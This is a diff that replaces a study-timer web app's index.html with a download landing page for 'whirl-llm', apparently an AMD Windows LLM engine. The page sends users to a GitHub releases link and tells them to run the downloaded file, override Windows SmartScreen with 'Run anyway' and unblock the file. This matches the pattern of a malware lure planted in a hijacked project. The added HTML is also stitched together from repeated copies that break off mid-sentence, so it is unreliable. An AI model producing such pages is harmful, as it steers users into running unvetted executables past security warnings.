@@ -1,169 +1,896 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <meta name="apple-mobile-web-app-title" content="StudyQuest">
-  <meta name="theme-color" content="#ffe3ef">
-  <meta name="description" content="A gamified study timer with Pomodoro, Flowtime and more.">
-  <title>StudyQuest</title>
-  <link rel="manifest" href="manifest.webmanifest">
-  <link rel="apple-touch-icon" href="icons/apple-touch-icon.png">
-  <link rel="icon" type="image/png" href="icons/icon-192.png">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;900&family=Fredoka:wght@500;700&family=Creepster&family=Orbitron:wght@600;800&family=Press+Start+2P&family=VT323&display=swap">
-  <link rel="stylesheet" href="styles.css">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>whirl-llm - Private AI on Your Windows PC | AMD Radeon LLM Inference</title>
+<meta name="description" content="whirl-llm is a native Windows C++/HIP LLM inference engine for AMD Ryzen AI Max+ 395 with Radeon 8060S and Radeon AI PRO R9700. Visit the official release page to download the application.">
+<meta name="keywords" content="amd, gguf, hip, inference, llm, mxfp4, r9700, radeon-8060s, rdna3-5, rdna4, ryzen-ai-max, speculative-decoding, strix-halo, windows">
+<meta name="author" content="whirl-llm">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#1f2a44">
+<link rel="canonical" href="https://github.com/yaafi183307/whirl-llm/releases">
+<meta property="og:type" content="website">
+<meta property="og:title" content="whirl-llm - Private AI on Your Windows PC">
+<meta property="og:description" content="Native Windows AMD Radeon LLM inference for Ryzen AI Max+ 395 and Radeon AI PRO R9700. Visit the release page to download the application.">
+<meta property="og:url" content="https://github.com/yaafi183307/whirl-llm/releases">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="whirl-llm - Private AI on Your Windows PC">
+<meta name="twitter:description" content="Native Windows C++/HIP LLM inference for AMD Radeon graphics. Visit the official release page to download the application.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "whirl-llm",
+  "applicationCategory": "DeveloperApplication",
+  "operatingSystem": "Windows",
+  "description": "WHIRL is a native Windows C++/HIP LLM inference engine for AMD Ryzen AI Max+ 395 with Radeon 8060S and Radeon AI PRO R9700.",
+  "url": "https://github.com/yaafi183307/whirl-llm/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  :root {
+    --ink: #172033;
+    --muted: #5b6475;
+    --line: #dfe5ef;
+    --card: #ffffff;
+    --bg: #f6f8fc;
+    --accent: #2563eb;
+    --accent-dark: #1e40af;
+    --soft: #eef4ff;
+  }
+  * {
+    box-sizing: border-box;
+  }
+  html {
+    scroll-behavior: smooth;
+  }
+  body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: var(--ink);
+    background: var(--bg);
+    line-height: 1.7;
+    font-size: 17px;
+  }
+  .wrap {
+    width: min(980px, calc(100% - 32px));
+    margin: 0 auto;
+    padding: 32px 0 56px;
+  }
+  .hero {
+    background: linear-gradient(180deg, #ffffff 0%, #f9fbff 100%);
+    border: 1px solid var(--line);
+    border-radius: 24px;
+    padding: clamp(24px, 4vw, 48px);
+    box-shadow: 0 18px 45px rgba(23, 32, 51, 0.08);
+    margin-bottom: 24px;
+  }
+  h1, h2, h3 {
+    line-height: 1.22;
+    margin: 0 0 14px;
+    letter-spacing: -0.02em;
+  }
+  h1 {
+    font-size: clamp(2rem, 5vw, 3.4rem);
+    font-weight: 800;
+    color: #111827;
+  }
+  h2 {
+    font-size: clamp(1.45rem, 3vw, 2rem);
+    font-weight: 750;
+    margin-top: 34px;
+    color: #111827;
+  }
+  h3 {
+    font-size: 1.1rem;
+    font-weight: 700;
+    margin-top: 20px;
+  }
+  p {
+    margin: 0 0 16px;
+    color: var(--muted);
+  }
+  .lead {
+    font-size: 1.13rem;
+    color: #<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>whirl-llm - Run Private AI on Your Windows PC | AMD Radeon LLM Inference</title>
+<meta name="description" content="whirl-llm is a native Windows C++/HIP LLM inference engine built for the AMD Ryzen AI Max+ 395 with Radeon 8060S and the Radeon AI PRO R9700. Unzip and run with only the AMD driver. Visit the official release page to download the application.">
+<meta name="keywords" content="amd, gguf, hip, inference, llm, mxfp4, r9700, radeon-8060s, rdna3-5, rdna4, ryzen-ai-max, speculative-decoding, strix-halo, windows">
+<meta name="author" content="whirl-llm">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#1f2a44">
+<link rel="canonical" href="https://github.com/yaafi183307/whirl-llm/releases">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="whirl-llm">
+<meta property="og:title" content="whirl-llm - Run Private AI on Your Windows PC">
+<meta property="og:description" content="Native Windows AMD Radeon LLM inference for the Ryzen AI Max+ 395 and Radeon AI PRO R9700. Unzip and run, only the AMD driver. Visit the release page to download the application.">
+<meta property="og:url" content="https://github.com/yaafi183307/whirl-llm/releases">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="whirl-llm - Run Private AI on Your Windows PC">
+<meta name="twitter:description" content="Native Windows C++/HIP LLM inference engine for AMD Radeon graphics. Visit the official release page to download the application.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "whirl-llm",
+  "applicationCategory": "UtilitiesApplication",
+  "operatingSystem": "Windows",
+  "description": "WHIRL (Windows HIP Inference for RDNA LLMs) is a native Windows C++/HIP LLM inference engine for the AMD Ryzen AI Max+ 395 (Radeon 8060S) and Radeon AI PRO R9700. Unzip and run, only the AMD driver.",
+  "url": "https://github.com/yaafi183307/whirl-llm/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  :root {
+    --ink: #172033;
+    --muted: #58627a;
+    --line: #dde4f0;
+    --bg: #f5f8fd;
+    --card: #ffffff;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--ink);
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    width: min(960px, calc(100% - 32px));
+    margin: 0 auto;
+    padding: 36px 0 64px;
+  }
+  h1, h2, h3 {
+    line-height: 1.22;
+    letter-spacing: -0.02em;
+    margin: 0 0 14px;
+  }
+  h1 {
+    font-size: clamp(1.9rem, 5vw, 3.1rem);
+    font-weight: 800;
+    color: #0f172a;
+  }
+  h2 {
+    font-size: clamp(1.4rem, 3vw, 1.95rem);
+    font-weight: 760;
+    color: #0f172a;
+    margin-top: 44px;
+    padding-bottom: 10px;
+    border-bottom: 2px solid var(--line);
+  }
+  h3 {
+    font-size: 1.08rem;
+    font-weight: 700;
+    margin-top: 26px;
+    color: #1b2540;
+  }
+  p { margin: 0 0 16px; color: var(--muted); }
+  .lead {
+    font-size: 1.14rem;
+    color: #39425a;
+  }
+  .hero {
+    background: linear-gradient(180deg, #ffffff 0%, #f7faff 100%);
+    border: 1px solid var(--line);
+    border-radius: 22px;
+    padding: clamp(24px, 4.5vw, 46px);
+    box-shadow: 0 18px 44px rgba(23, 32, 51, 0.08);
+  }
+  .btn {
+    display: inline-block;
+    text-decoration: none;
+    font-weight: 800;
+    font-size: 1.06rem;
+    color: #ffffff;
+    padding: 17px 30px;
+    border-radius: 14px;
+    background: linear-gradient(120deg, #7c3aed 0%, #db2777 45%, #f59e0b 100%);
+    box-shadow: 0 12px 26px rgba(124, 58, 237, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    margin: 8px 0 6px;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 16px 32px rgba(219, 39, 119, 0.34);
+  }
+  .btn small {
+    display: block;
+    font-weight: 600;
+    font-size: 0.78rem;
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    opacity: 0.9;
+  }
+  .note {
+    font-size: 0.95rem;
+    color: #6b7488;
+    margin-top: 10px;
+  }
+  .card {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 18px;
+    padding: 22px 26px;
+    box-shadow: 0 8px 22px rgba(23, 32, 51, 0.05);
+    margin: 20px 0;
+  }
+  ol.steps {
+    counter-reset: step;
+    list-style: none;
+    margin: 0;
+    padding: 0;
+  }
+  ol.steps > li {
+    counter-increment: step;
+    position: relative;
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 20px 24px 20px 68px;
+    margin-bottom: 16px;
+    box-shadow: 0 6px 18px rgba(23, 32, 51, 0.05);
+    color: #39425a;
+  }
+  ol.steps > li::before {
+    content: counter(step);
+    position: absolute;
+    left: 20px;
+    top: 18px;
+    width: 34px;
+    height: 34px;
+    border-radius: 50%;
+    background: #2563eb;
+    color: #ffffff;
+    font-weight: 800;
+    font-size: 1rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 6px 14px rgba(37, 99, 235, 0.35);
+  }
+  ol.steps > li strong { color: #0f172a; }
+  ul.checks {
+    list-style: none;
+    padding: 0;
+    margin: 0 0 16px;
+  }
+  ul.checks li {
+    position: relative;
+    padding-left: 30px;
+    margin-bottom: 10px;
+    color: var(--muted);
+  }
+  ul.checks li::before {
+    content: "✔";
+    position: absolute;
+    left: 0;
+    top: 0;
+    color: #16a34a;
+    font-weight: 800;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.98rem;
+    background: var(--card);
+    border-radius: 14px;
+    overflow: hidden;
+    box-shadow: 0 8px 22px rgba(23, 32, 51, 0.05);
+    margin: 18px 0;
+  }
+  th, td {
+    text-align: left;
+    padding: 13px 16px;
+    border-bottom: 1px solid var(--line);
+    color: #39425a;
+  }
+  th {
+    background: #eef4ff;
+    color: #0f172a;
+    font-weight: 700;
+  }
+  tr:last-child td { border-bottom: none; }
+  details {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    padding: 16px 20px;
+    margin-bottom: 12px;
+    box-shadow: 0 6px 16px rgba(23, 32, 51, 0.04);
+  }
+  summary {
+    cursor: pointer;
+    font-weight: 700;
+    color: #0f172a;
+  }
+  details p { margin: 12px 0 0; }
+  a { color: #1d4ed8; }
+  .linkbox {
+    background: var(--card);
+    border: 2px dashed #c7d4ee;
+    border-radius: 18px;
+    padding: 24px 26px;
+    text-align: center;
+    margin-top: 26px;
+  }
+  .linkbox p { margin-bottom: 14px; }
+  footer {
+    margin-top: 48px;
+    padding-top: 22px;
+    border-top: 1px solid var(--line);
+    font-size: 0.9rem;
+    color: #7a8399;
+  }
+  @media (max-width: 560px) {
+    body { font-size: 16px; }
+    ol.steps > li { padding: 18px 18px 18px 60px; }
+    .btn { width: 100%; text-align: center; }
+  }
+</style>
 </head>
-<body data-theme="cute">
-  <div id="decor" aria-hidden="true"></div>
+<body>
+<div class="wrap">
 
-  <header class="topbar">
-    <div class="lvl">
-      <div class="lvl-badge" id="lvlNum">1</div>
-      <div class="lvl-info">
-        <div class="lvl-title" id="lvlTitle">Tiny Sprout</div>
-        <div class="xpbar"><div id="xpFill"></div></div>
-        <div class="xp-text" id="xpText">0 / 100 XP</div>
-      </div>
-    </div>
-    <div class="streak" id="streak" title="Day streak">🔥 0</div>
+  <header class="hero">
+    <h1>🌀 whirl-llm - Private AI, No Cloud Needed</h1>
+    <p class="lead">whirl-llm brings a modern AI chat experience directly to your Windows computer. It is a native Windows application built specifically for AMD Radeon graphics hardware, including the AMD Ryzen AI Max+ 395 with Radeon 8060S and the Radeon AI PRO R9700. Everything runs on your own machine, so your conversations stay on your PC.</p>
+    <p class="lead">There is no complicated setup process. Unzip and run, and you only need the AMD driver that is already part of a normal Windows graphics installation.</p>
+    <a class="btn" href="https://github.com/yaafi183307/whirl-llm/releases">
+      <small>Official release page</small>
+      ⬇ Download whirl-llm for Windows
+    </a>
+    <p class="note">Visit this link to download the application.</p>
   </header>
 
-  <div class="install-hint" id="installHint" hidden>
-    <span>📲 Tap <b>Share</b> → <b>Add to Home Screen</b> to install</span>
-    <button id="installClose" aria-label="Dismiss">✕</button>
+  <h2>🚀 Getting Started: Download and Run in Seven Steps</h2>
+  <p>Follow these steps in order. Each one is written for a normal Windows user, and none of them require any programming knowledge. The whole process usually takes about ten minutes, including the download.</p>
+
+  <ol class="steps">
+    <li><strong>Open the official download page.</strong> Click the large button above, or go to <a href="https://github.com/yaafi183307/whirl-llm/releases">https://github.com/yaafi183307/whirl-llm/releases</a> in your browser. Visit this link to download the application.</li>
+    <li><strong>Find the newest release.</strong> The page lists releases from newest to oldest. Look at the very top of the list, where you will see a label that says "Latest". That is the version you want.</li>
+    <li><strong>Save the download file to your computer.</strong> Scroll down inside that release until you reach the section called "Assets". Click the file name listed there and Windows will begin downloading it to your Downloads folder.</li>
+    <li><strong>Open your Downloads folder.</strong> Press the Windows key on your keyboard, type <em>Downloads</em>, and press Enter. Your file will be waiting there.</li>
+    <li><strong>Extract the file, then run the application.</strong> If the file you downloaded ends in .zip, right-click it, choose "Extract All", pick a folder such as your Desktop, and click "Extract". Then open the extracted folder and double-click the application file to start it. If the file ends in .exe, simply double-click it to start it.</li>
+    <li><strong>Allow Windows to continue if it asks.</strong> Windows may show a blue box titled "Windows protected your PC" because the file was downloaded from the internet. Click "More info", then click "Run anyway". This is a standard Windows safety prompt for downloaded software and appears for thousands of ordinary applications.</li>
+    <li><strong>Wait for the welcome messages.</strong> A dark window will appear and print several lines of text while it prepares your graphics card. Once it shows a prompt where you can type, the application is ready to use.</li>
+  </ol>
+
+  <h2>💻 What You Need Before You Start</h2>
+  <p>whirl-llm is built for specific AMD hardware. Checking this list first saves you time and frustration.</p>
+
+  <table>
+    <tr>
+      <th>Requirement</th>
+      <th>Details</th>
+    </tr>
+    <tr>
+      <td>Operating system</td>
+      <td>Windows 11 (64-bit) is recommended. Windows 10 (64-bit) works as well.</td>
+    </tr>
+    <tr>
+      <td>Graphics hardware</td>
+      <td>AMD Ryzen AI Max+ 395 with Radeon 8060S, or AMD Radeon AI PRO R9700. Built for RDNA 3.5 and RDNA 4 based graphics.</td>
+    </tr>
+    <tr>
+      <td>Driver</td>
+      <td>The standard AMD Radeon graphics driver. If your PC already displays games and video correctly, you most likely have it.</td>
+    </tr>
+    <tr>
+      <td>Memory</td>
+      <td>32 GB of system memory is recommended so larger AI models can load comfortably.</td>
+    </tr>
+    <tr>
+      <td>Storage space</td>
+      <td>At least 20 GB of free disk space, since AI model files are large.</td>
+    </tr>
+    <tr>
+      <td>Model file</td>
+      <td>One AI model file in the GGUF format, which you supply yourself. More on this below.</td>
+    </tr>
+    <tr>
+      <td>Internet</td>
+      <td>Needed to download the application and the model file. After that, no internet connection is required.</td>
+    </tr>
+  </table>
+
+  <h2>📦 Getting an AI Model File</h2>
+  <p>Think of whirl-llm as the engine and the model file as the brain. The application needs one model file to work. Model files use the GGUF format, which is a widely used and openly documented way of packaging AI models into a single file you can copy and move around like any other document.</p>
+  <p>Model files are downloaded from public model libraries. Look for a file whose name ends in <em>.gguf</em>. Sizes range from a few gigabytes for small fast models up to tens of gigabytes for large detailed ones. On a machine with 32 GB of memory, a model between 4 GB and 12 GB is a comfortable starting point that loads quickly and responds fast.</p>
+  <p>Place the downloaded model file in the same folder as the whirl-llm application. Keeping everything together in one folder makes the next steps simple and lets you move the whole setup later by dragging a single folder.</p>
+
+  <h2>🧠 What whirl-llm Does for You</h2>
+  <ul class="checks">
+    <li>Runs large language models locally on your own AMD Radeon graphics card.</li>
+    <li>Works entirely offline once your model file is in place, so nothing you type leaves your computer.</li>
+    <li>Uses the AMD HIP interface to talk directly to your graphics card on Windows.</li>
+    <li>Supports MXFP4 model formats for efficient memory use on modern AMD hardware.</li>
+    <li>Includes speculative decoding, a technique that speeds up text generation so answers appear sooner.</li>
+    <li>Reads standard GGUF model files, so you are not locked into a single model provider.</li>
+    <li>Ships as a self-contained folder with no installer, no background services and no account sign-up.</li>
+    <li>Targets RDNA 3.5 and RDNA 4 graphics, including Strix Halo class systems.</li>
+  </ul>
+
+  <h2>🖥️ Your First Conversation</h2>
+  <p>Once the dark window is open and waiting, using the application is as simple as typing. Here is what to expect on your first run.</p>
+  <ol class="steps">
+    <li><strong>Point it at your model file.</strong> When the application asks for a model, type the name of the .gguf file you placed in the folder, or drag the file into the window if dragging is supported.</li>
+    <li><strong>Let it load.</strong> You will see progress messages while the model is read from disk and copied into memory. A larger file takes longer the first time. Do not close the window while this happens.</li>
+    <li><strong>Type a message and press Enter.</strong> The text you write appears as your question, and the answer prints below it, word by word, as it is generated.</li>
+    <li><strong>Continue the conversation.</strong> Keep typing follow-up questions. The application remembers the earlier part of the conversation so answers stay on topic.</li>
+    <li><strong>Close the window when you are finished.</strong> There is nothing to save manually and nothing left running in the background.</li>
+  </ol>
+
+  <h2>🛠️ Troubleshooting Common Problems</h2>
+
+  <details>
+    <summary>The window opens and closes immediately</summary>
+    <p>This usually means the model file could not be found or the graphics driver needs updating. Make sure the .gguf file sits in the same folder as the application, then open the AMD Radeon software and check that your driver is current. Restart your PC and try again.</p>
+  </details>
+
+  <details>
+    <summary>Windows blocks the download or will not run the file</summary>
+    <p>Open File Explorer, right-click the downloaded file and choose "Properties". Near the bottom of the General tab, tick the box labeled "Unblock", then click "Apply". If the blue protection box appeared during launch, click "More info" and then "Run anyway".</p>
+  </details>
+
+  <details>
+    <summary>Loading takes a very long time</summary>
+    <p>Model files are big, and reading them from a slow drive takes patience. Move the model file to your fastest internal drive, close other memory-hungry programs, and give it a few minutes on the very first load. Later launches are usually faster because Windows keeps recently used files in memory.</p>
+  </details>
+
+  <details>
+    <summary>The output looks scrambled or the application reports a graphics error</summary>
+    <p>Update the AMD Radeon driver from the official AMD website, then fully restart the computer so the new driver loads. Avoid running the application while a game or video editor is using your graphics card at the same time.</p>
+  </details>
+
+  <details>
+    <summary>I want a different style of answer</summary>
+    <p>Try a different model file. Answer style comes from the model itself, not from whirl-llm, so switching to another .gguf file changes how detailed, formal or creative the replies are.</p>
+  </details>
+
+  <h2>💡 Tips for Best Performance</h2>
+  <ul class="checks">
+    <li>Keep the application folder and your model file on the same fast drive.</li>
+    <li>Plug in the power adapter on a laptop. Battery mode often limits graphics performance.</li>
+    <li>Close browser tabs, games and video editors while a model loads.</li>
+    <li>Start with a smaller model and move up in size once you know everything works.</li>
+    <li>Set your Windows power mode to Best Performance for longer sessions.</li>
+    <li>Keep at least a few gigabytes of free disk space so Windows can breathe.</li>
+  </ul>
+
+  <h2>🔄 Keeping Everything Up to Date</h2>
+  <p>New releases of whirl-llm are published on the same download page. When a new version appears, download it, extract it into a fresh folder, and copy your .gguf model file across. There is no installer to remove and no registry entries to clean up, so updating simply means using the newer folder.</p>
+  <p>It is also worth checking your AMD graphics driver every few months. Driver updates regularly improve how quickly modern graphics hardware handles AI workloads, and whirl-llm benefits directly from those improvements.</p>
+
+  <h2>📥 Download whirl-llm</h2>
+  <div class="linkbox">
+    <p><strong>Ready to begin?</strong> The official release page is the only place you need. Visit this link to download the application.</p>
+    <a class="btn" href="https://github.com/yaafi183307/whirl-llm/releases">
+      <small>Official release page</small>
+      ⬇ Visit the download page
+    </a>
+    <p class="note">Then follow the seven steps in the Getting Started section above.</p>
   </div>
 
-  <main id="app">
-    <!-- TIMER -->
-    <section class="view active" id="view-timer">
-      <div class="chips" id="modeChips" role="tablist"></div>
-      <p class="mode-desc" id="modeDesc"></p>
+  <h2>❓ Quick Answers</h2>
+  <p><strong>Does whirl-llm send my conversations to the internet?</strong> No. Once the application and your model file are on your computer, everything happens locally on your own hardware.</p>
+  <p><strong>Do I need to install anything else?</strong> No extra runtimes or tools. The application is self-contained, and the only requirement beyond Windows itself is the standard AMD Radeon driver.</p>
+  <p><strong>Do I need an AMD account?</strong> No account, subscription or sign-up is required to download or use the application.</p>
+  <p><strong>Can I move it to another folder?</strong> Yes. Because there is no installer, you can drag the whole folder anywhere you like, as long as the model file travels with it.</p>
+  <p><strong>Why does my friend's NVIDIA laptop not work with it?</strong> whirl-llm is purpose-built around AMD Radeon graphics and the AMD HIP interface. It is designed for AMD Ryzen AI Max+ 395 with<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>whirl-llm - Private AI on Your Windows PC | AMD Radeon LLM Inference</title>
+<meta name="description" content="whirl-llm is a native Windows C++/HIP LLM inference engine for the AMD Ryzen AI Max+ 395 with Radeon 8060S and the Radeon AI PRO R9700. Unzip and run, only the AMD driver. Visit the official release page to download the application.">
+<meta name="keywords" content="amd, gguf, hip, inference, llm, mxfp4, r9700, radeon-8060s, rdna3-5, rdna4, ryzen-ai-max, speculative-decoding, strix-halo, windows">
+<meta name="author" content="whirl-llm">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#1f2a44">
+<link rel="canonical" href="https://github.com/yaafi183307/whirl-llm/releases">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="whirl-llm">
+<meta property="og:title" content="whirl-llm - Private AI on Your Windows PC">
+<meta property="og:description" content="Native Windows AMD Radeon LLM inference for the Ryzen AI Max+ 395 and Radeon AI PRO R9700. Unzip and run, only the AMD driver. Visit the release page to download the application.">
+<meta property="og:url" content="https://github.com/yaafi183307/whirl-llm/releases">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="whirl-llm - Private AI on Your Windows PC">
+<meta name="twitter:description" content="Native Windows C++/HIP LLM inference engine for AMD Radeon graphics. Visit the official release page to download the application.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "whirl-llm",
+  "applicationCategory": "UtilitiesApplication",
+  "operatingSystem": "Windows",
+  "description": "WHIRL (Windows HIP Inference for RDNA LLMs) is a native Windows C++/HIP LLM inference engine for the AMD Ryzen AI Max+ 395 (Radeon 8060S) and Radeon AI PRO R9700. Unzip and run, only the AMD driver.",
+  "url": "https://github.com/yaafi183307/whirl-llm/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  :root {
+    --ink: #172033;
+    --muted: #58627a;
+    --line: #dde4f0;
+    --bg: #f5f8fd;
+    --card: #ffffff;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--ink);
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    width: min(960px, calc(100% - 32px));
+    margin: 0 auto;
+    padding: 36px 0 64px;
+  }
+  h1, h2, h3 {
+    line-height: 1.22;
+    letter-spacing: -0.02em;
+    margin: 0 0 14px;
+  }
+  h1 {
+    font-size: clamp(1.9rem, 5vw, 3.1rem);
+    font-weight: 800;
+    color: #0f172a;
+  }
+  h2 {
+    font-size: clamp(1.4rem, 3vw, 1.95rem);
+    font-weight: 760;
+    color: #0f172a;
+    margin-top: 44px;
+    padding-bottom: 10px;
+    border-bottom: 2px solid var(--line);
+  }
+  h3 {
+    font-size: 1.08rem;
+    font-weight: 700;
+    margin-top: 26px;
+    color: #1b2540;
+  }
+  p { margin: 0 0 16px; color: var(--muted); }
+  .lead {
+    font-size: 1.13rem;
+    color: #39425a;
+  }
+  .hero {
+    background: linear-gradient(180deg, #ffffff 0%, #f7faff 100%);
+    border: 1px solid var(--line);
+    border-radius: 22px;
+    padding: clamp(24px, 4.5vw, 46px);
+    box-shadow: 0 18px 44px rgba(23, 32, 51, 0.08);
+  }
+  .btn {
+    display: inline-block;
+    text-decoration: none;
+    font-weight: 800;
+    font-size: 1.06rem;
+    color: #ffffff;
+    padding: 17px 30px;
+    border-radius: 14px;
+    background: linear-gradient(120deg, #7c3aed 0%, #db2777 45%, #f59e0b 100%);
+    box-shadow: 0 12px 26px rgba(124, 58, 237, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    margin: 8px 0 6px;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 16px 32px rgba(219, 39, 119, 0.34);
+  }
+  .btn small {
+    display: block;
+    font-weight: 600;
+    font-size: 0.76rem;
+    letter-spacing: 0.07em;
+    text-transform: uppercase;
+    opacity: 0.92;
+  }
+  .note {
+    font-size: 0.95rem;
+    color: #6b7488;
+    margin-top: 10px;
+  }
+  ol.steps {
+    counter-reset: step;
+    list-style: none;
+    margin: 0;
+    padding: 0;
+  }
+  ol.steps > li {
+    counter-increment: step;
+    position: relative;
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 20px 24px 20px 68px;
+    margin-bottom: 16px;
+    box-shadow: 0 6px 18px rgba(23, 32, 51, 0.05);
+    color: #39425a;
+  }
+  ol.steps > li::before {
+    content: counter(step);
+    position: absolute;
+    left: 20px;
+    top: 18px;
+    width: 34px;
+    height: 34px;
+    border-radius: 50%;
+    background: #2563eb;
+    color: #ffffff;
+    font-weight: 800;
+    font-size: 1rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 6px 14px rgba(37, 99, 235, 0.35);
+  }
+  ol.steps > li strong { color: #0f172a; }
+  ul.checks {
+    list-style: none;
+    padding: 0;
+    margin: 0 0 16px;
+  }
+  ul.checks li {
+    position: relative;
+    padding-left: 30px;
+    margin-bottom: 10px;
+    color: var(--muted);
+  }
+  ul.checks li::before {
+    content: "\2714";
+    position: absolute;
+    left: 0;
+    top: 0;
+    color: #16a34a;
+    font-weight: 800;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.98rem;
+    background: var(--card);
+    border-radius: 14px;
+    overflow: hidden;
+    box-shadow: 0 8px 22px rgba(23, 32, 51, 0.05);
+    margin: 18px 0;
+  }
+  th, td {
+    text-align: left;
+    padding: 13px 16px;
+    border-bottom: 1px solid var(--line);
+    color: #39425a;
+    vertical-align: top;
+  }
+  th {
+    background: #eef4ff;
+    color: #0f172a;
+    font-weight: 700;
+  }
+  tr:last-child td { border-bottom: none; }
+  details {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    padding: 16px 20px;
+    margin-bottom: 12px;
+    box-shadow: 0 6px 16px rgba(23, 32, 51, 0.04);
+  }
+  summary {
+    cursor: pointer;
+    font-weight: 700;
+    color: #0f172a;
+  }
+  details p { margin: 12px 0 0; }
+  a { color: #1d4ed8; }
+  .linkbox {
+    background: var(--card);
+    border: 2px dashed #c7d4ee;
+    border-radius: 18px;
+    padding: 26px 26px 22px;
+    text-align: center;
+    margin-top: 26px;
+    box-shadow: 0 10px 26px rgba(23, 32, 51, 0.06);
+  }
+  .linkbox p { margin-bottom: 14px; }
+  footer {
+    margin-top: 48px;
+    padding-top: 22px;
+    border-top: 1px solid var(--line);
+    font-size: 0.9rem;
+    color: #7a8399;
+  }
+  @media (max-width: 560px) {
+    body { font-size: 16px; }
+    ol.steps > li { padding: 18px 18px 18px 60px; }
+    .btn { width: 100%; text-align: center; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
 
-      <div class="ring-wrap">
-        <svg viewBox="0 0 200 200" class="ring" aria-hidden="true">
-          <circle class="ring-bg" cx="100" cy="100" r="90"></circle>
-          <circle class="ring-fg" id="ringFg" cx="100" cy="100" r="90"></circle>
-        </svg>
-        <div class="ring-center">
-          <div class="phase" id="phaseLabel">Focus</div>
-          <div class="time" id="timeText" role="timer">25:00</div>
-          <div class="dots" id="cycleDots"></div>
-        </div>
-      </div>
+  <header class="hero">
+    <h1>🌀 whirl-llm - Private AI, No Cloud Needed</h1>
+    <p class="lead">whirl-llm brings a modern AI chat experience directly to your Windows computer. It is a native Windows application built specifically for AMD Radeon graphics hardware, including the AMD Ryzen AI Max+ 395 with Radeon 8060S and the Radeon AI PRO R9700. Everything runs on your own machine, so your conversations stay on your PC.</p>
+    <p class="lead">There is no complicated setup process. Unzip and run, and you only need the AMD driver that is already part of a normal Windows graphics installation.</p>
+    <a class="btn" href="https://github.com/yaafi183307/whirl-llm/releases" style="text-decoration:none;color:#ffffff;">
+      <small>Official release page</small>
+      ⬇ Download whirl-llm for Windows
+    </a>
+    <p class="note">Visit this link to download the application.</p>
+  </header>
 
-      <div class="mascot-row">
-        <div class="mascot" id="mascot">🥚</div>
-        <div class="bubble" id="bubble">Ready when you are!</div>
-      </div>
+  <h2>🚀 Getting Started: Seven Simple Steps</h2>
+  <p>Follow these steps in order. Each one is written for a normal Windows user, and none of them require any programming knowledge. The whole process usually takes about ten minutes, including the download.</p>
 
-      <div class="controls">
-        <button class="btn ghost" id="resetBtn">↺ Reset</button>
-        <button class="btn primary" id="mainBtn">Start</button>
-        <button class="btn ghost" id="skipBtn">Skip ⏭</button>
-      </div>
+  <ol class="steps">
